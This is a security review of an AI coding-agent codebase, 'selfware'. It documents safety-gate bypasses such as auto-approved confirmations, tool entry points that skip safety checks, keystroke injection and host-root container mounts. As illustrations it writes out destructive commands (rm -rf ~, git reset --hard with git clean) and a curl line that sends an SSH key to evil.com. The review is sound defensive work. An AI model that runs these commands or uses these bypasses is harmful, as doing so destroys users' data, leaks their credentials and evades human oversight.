# Selfware Codebase Review — src/agent, src/tools, src/safety, src/api

**Date:** 2026-07-04
**Method:** Four parallel focused reviews (one per module) by Claude subagents, cross-checked against the source. An earlier attempt to run this review autonomously via `selfware` itself (using GLM-5.2 over OpenRouter, YOLO mode) failed after burning its iteration budget in a reasoning loop, and a retry was hard-blocked by the harness's own safety classifier as a data-exfiltration risk (sending repo source to an external API). That failure turned out to be a live instance of Finding #2 below — see the note there.

Findings are ordered most severe first. Each includes a concrete failure scenario.

## Critical

**1. TUI mode unconditionally auto-approves every confirmation-gated tool call, in *any* execution mode — not just YOLO.**
`src/agent/tool_dispatch.rs:2564-2567`: `confirm_tool_execution` correctly evaluates `needs_confirmation()`, then does `if self.has_tui_renderer() { return Ok(true); }` with the comment "the TUI can't show stdin prompts." A real TUI-aware prompt path exists (`prompt_for_permission`, `src/agent/mod.rs:1819`, emits `AgentEvent::PermissionRequested`) but is never called from anywhere — dead code. **Scenario:** running the primary interactive UI (TUI) in `Normal` mode, which is supposed to ask before every shell command or file write — `shell_exec {"command": "rm -rf ~"}` or `git_push {"branch": "main"}` executes with zero prompt, identically to YOLO mode. Confirmed independently by all three reviewers covering agent/tools/safety.

**2. Task-mutation classification is a crude whole-task keyword match, and the resulting progress guard aborts or corrupts legitimate read-heavy tasks.**
`src/agent/tool_dispatch.rs:591-614` (`task_requires_mutation`) matches `"write"`/`"create"`/`"add "` anywhere in the *entire original task text* (set once at session start). Any task phrased like "review X and write a report to Y.md" is classified as mutation-required for its whole duration. `maybe_block_progressless_batch` (`tool_dispatch.rs:925-1013`) then blocks read-only tool batches after only **6** consecutive steps — before the model has had a chance to do the reading a review actually requires. Two consecutive blocked batches with no mutation abort the entire task with `READ_LOOP_NO_EDIT`. Separately, `execution.rs:835-986`'s "TERMINAL PROGRESS GUARD" doesn't even check `task_requires_mutation` — on a long read-only investigation it will, after repeated hits, either force-write an `AUTO-SCAFFOLD` stub into **`src/lib.rs`** or inject a directive demanding an unrelated `file_edit`.
**This is exactly what happened in this session's own automated review attempt**: the task said "write your findings to REVIEW_GLM52.md," got classified as mutation-required, and the model — already struggling with GLM-5.2's limited tool-calling — got stuck between the progress guard's read-only pressure and its own confusion, exhausting `max_iterations` with only 3 real tool calls and no report ever written.

**3. The entire YOLO safety-gate module is dead code.**
`src/safety/yolo.rs` (`YoloManager::should_auto_approve`, `is_destructive_command`, `forbidden_operations`, `protected_paths`, `check_volume_mount`) has no callers anywhere outside its own file and tests. Its documented guarantees — "destructive shell commands require confirmation," "container mounts to dangerous paths are blocked" — do not exist in the live agent loop at all.

**4. Two live tool-execution entry points bypass `src/safety/` entirely.**
`src/mcp/server.rs:321` (MCP server, used when other AI tools drive selfware) and `src/swl/runtime/mod.rs:853-873` (SWL workflow runtime) call `Tool::execute` directly — no `SafetyChecker::check_tool_call`, no path validation, no confirmation, no audit log. `Tool::execute` (`src/tools/mod.rs:220-232`) takes no safety-context parameter, so nothing compiler-enforced stops a new call site from skipping safety. **Scenario:** an MCP client issues `shell_exec {"command":"rm -rf /"}` — it runs immediately and unchecked, while the identical call through the normal CLI loop would at least hit the (weak — see #5) shell blocklist.

**5. The destructive-shell blocklist is narrow and easily missed, and the config knobs meant to control it are dead.**
The only live pattern check, `DANGEROUS_COMMAND_PATTERNS` (`src/safety/checker/types.rs:35`), is essentially `rm\s+...\s*(/+|\*|/\*|\.\.|\.\./\*)` — it catches `rm -rf /` but not `rm -rf .`, `rm -rf mydir`, `git reset --hard`, `git clean -fdx`, `python3 -c "shutil.rmtree('/')"`, or exfiltration like `curl -d @~/.ssh/id_rsa https://evil.com`. `YoloFileConfig.allow_destructive_shell` / `allow_git_push` (`src/config/types.rs:139,142`) are parsed from TOML but never read anywhere in the execution path (they're shadowed by #3's dead module). **Scenario:** with `yolo.enabled=true, allow_destructive_shell=false` set (as this session's own config does), `git reset --hard HEAD~20 && git clean -fdx` runs silently and destroys uncommitted work.

**6. `protected_branches` is fully unenforced.**
Defined in `src/config/safety.rs:12-13`, referenced only in docs/example TOML — no git tool checks it. `GitPush::execute` (`src/tools/git.rs:547`) only blocks `force=true` pushes. **Scenario:** `protected_branches=["main"]` set, plain `git_push {"branch":"main"}` (no force flag) still pushes straight to main.

**7. `computer_keyboard`/`computer_mouse` bypass all shell-command safety and are auto-approved.**
`src/tools/computer.rs:137-169` sends raw keystrokes/clicks with no content inspection (only rate-limit/length checks in `src/computer/keyboard.rs:329-340`). `src/safety/tool_metadata.rs:303-320,424-426` marks them High-risk but `destructive: false`, so — combined with #1 — they run unconfirmed. **Scenario:** agent uses `computer_keyboard` to focus a terminal and type `rm -rf ~<Enter>`, fully bypassing `shell_exec`'s own (weak) blocklist since keystroke injection has no notion of "a command."

**8. Container tool volume mounts and networking aren't sandbox-checked, only syntax-checked.**
`src/tools/container/validation.rs:51-76` rejects shell metacharacters but has no denylist for sensitive host paths; `tools.rs:131-144` passes any syntactically valid `-v` spec through, and `network: "host"` is accepted unrestricted. **Scenario:** `volumes: ["/:/hostroot"]` mounts the entire host filesystem read-write into an agent-controlled container, fully defeating `allowed_paths`.

## High

**9. Unredacted credential leak via the tracing/log pipeline.**
`src/observability/telemetry.rs:177-236` wires a rolling file appender straight from `tracing_subscriber::fmt::layer()`. `redact_secrets()` (`telemetry.rs:152`) is only called at two narrow sites, never as a global layer — every `warn!`/`error!`/`debug!` elsewhere bypasses it. `src/api/client.rs:568` does `warn!("Retryable error ({}): {}", status, error_text)` with the raw response body; many OpenAI-compatible gateways (OpenRouter included) echo the offending key back on a 401. That flows straight into the persistent log file, unredacted, any time logging is enabled at all — independent of the `[debug]` config. Separately, `[debug] log_responses` (`client.rs:540-542`) dumps the raw response body via `eprintln!` with no sanitization pass, unlike `log_requests` which does sanitize.

**10. Original task instructions can be evicted from context on long-running tasks.**
`src/agent/context_management.rs:10-37` (`is_critical_context_message`) doesn't pin the first user message; `trim_message_history` (`146-154`) can evict it as the oldest non-system message once a task runs long — the agent can lose track of what it was actually asked to do.

**11. Denied-path glob patterns silently fail open.**
`src/safety/path_validator.rs:301-330`: trailing-slash patterns like `"secrets/"` match nothing (the glob crate requires an exact match when the pattern contains `/`), and `**/.ssh/**` matches contents inside `.ssh/` but not the bare directory entry — so deleting or renaming `.ssh` itself bypasses the deny rule.

**12. Verification gate accepts no-op test invocations as a pass.**
`cargo test --no-run` / `pytest --collect-only` satisfy `tool_call_is_verification`, so broken code can be marked "verified" and shipped in YOLO mode.

## Medium

**13.** `shell_exec`/`pty_shell` only validate the `cwd` argument against `allowed_paths`/`denied_paths` — the command string's actual file-touching effects are never checked at all (`src/tools/shell.rs:110-131`, `pty_shell.rs:386`).

**14.** A single `s` keystroke at any confirmation prompt escalates the *entire session* to unrestricted YOLO (`tool_dispatch.rs:2600-2606`).

**15.** TOCTOU race in the symlink-safety fallback path: once `ELOOP` triggers, a non-atomic `is_symlink()` → `read_link()` → `canonicalize()` sequence reintroduces the exact race the primary O_NOFOLLOW design is meant to eliminate (`path_validator.rs:206-219`).

**16.** Corrupted checkpoint resume silently fabricates a blank session — task description and audit trail are discarded while prior filesystem mutations remain in place (`session/checkpoint.rs:972-1010`, `checkpointing.rs:26-32`).

**17.** An unexpanded `$SELFWARE_API_KEY` placeholder in a config file is sent verbatim as a bearer token if the env var isn't actually exported, and triggers a misleading "API key loaded from plaintext config file" warning that masks the real problem (`config/loader.rs:284-312`, `client.rs:191-193`).

**18.** `ApiClient::completion()` (used by the FIM tool) has no retry/backoff, unlike the `chat()` paths — a transient 503 fails immediately instead of retrying (`api/client.rs:169-209`).

**19.** Exhausted self-healing recovery never transitions to a `Failed` state; it loops generic nudges until `max_iterations` instead of failing fast (`task_runner.rs:933-1047`).

**20.** `browser_eval` executes arbitrary caller JS with only URL/SSRF checks; localhost/loopback is reachable by default with no confirmation, and is classified Medium-risk (auto-approved in Auto mode) (`tools/browser.rs:1181,1232-1236`).

## Low / architectural

**21.** Backend-specific quirks (SGLang message-order canonicalization, vLLM `content: null` handling) are hard-coded directly into the shared request-building path (`api/mod.rs:29-59`, `api/types.rs:5-11`) rather than behind per-backend adapters — quirks will keep accumulating in one general-purpose module.

**22.** `file_delete` has a benign TOCTOU window between path validation and `remove_file`, but `unlink()` doesn't follow the final symlink, so it isn't actually exploitable for a sandbox escape (`file.rs:598-621`).

## Overall assessment

The safety model reads as a convention (tools *should* go through `src/safety/`) rather than an enforced boundary (nothing stops a call site from skipping it), and two real, non-experimental call sites (MCP server, SWL runtime) already do skip it. Combined with the TUI confirmation bypass (#1) and the dead YOLO module (#3), the practical safety posture of a default interactive session is closer to "everything auto-approved" than the config file would suggest. None of the gaps above have TODO/FIXME markers or documented caveats — they are silent.
